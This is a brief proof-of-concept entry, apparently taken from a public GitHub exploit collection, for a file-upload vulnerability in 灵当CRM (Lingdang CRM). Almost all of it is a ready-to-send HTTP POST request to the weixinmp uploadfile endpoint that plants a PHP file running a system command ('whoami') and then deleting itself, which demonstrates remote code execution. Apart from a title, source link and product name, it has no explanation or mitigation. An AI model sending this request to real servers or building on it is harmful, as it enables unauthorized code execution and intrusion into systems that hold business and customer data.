# ldcrm_uploadfile_fileupload

from： https://github.com/wy876/POC/blob/main/%E7%81%B5%E5%BD%93CRM/%E7%81%B5%E5%BD%93CRM%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3uploadfile%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md

product: 灵当CRM

```
POST /crm/weixinmp/index.php?userid=123&module=Upload&usid=1&action=uploadfile HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Connection: close

file_info={"name":"1.php"}&<?php system("whoami");unlink(__FILE__);?>
```
